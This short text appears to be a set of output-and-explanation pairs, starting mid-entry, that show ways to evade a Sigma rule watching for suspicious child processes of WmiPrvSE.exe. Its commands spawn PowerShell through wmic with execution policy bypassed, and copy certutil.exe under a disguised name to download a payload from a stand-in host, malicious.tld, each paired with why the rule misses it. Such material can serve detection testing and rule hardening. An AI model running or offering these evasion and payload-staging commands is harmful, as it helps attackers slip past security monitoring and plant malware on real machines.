explanation: Launches a benign child process (notepad.exe) from WmiPrvSE.exe, bypassing the rule which only checks for specific suspicious child executables.

output: wmic process call create "powershell.exe -ExecutionPolicy Bypass -Command \"Write-Host 'Executed directly'\""
explanation: The Sigma rule checks for 'powershell' in the command line only if the child process is exactly 'cmd.exe' (under selection\_children\_2). It completely omits 'powershell.exe' and 'pwsh.exe' from the direct child process list (selection\_children\_1). Spawning PowerShell directly via WMI evades this specific detection logic.

output: copy C:\Windows\System32\certutil.exe C:\Windows\Temp\updater.exe && wmic process call create "C:\Windows\Temp\updater.exe -urlcache -split -f http://malicious.tld/payload.exe C:\Windows\Temp\payload.exe"
explanation: The detection logic relies on exact string matching for the end of the file path (Image|endswith: '\certutil.exe', etc.). An adversary can bypass this by copying the LOLBin to a new file name before executing it via WMI, circumventing the static image name checks.
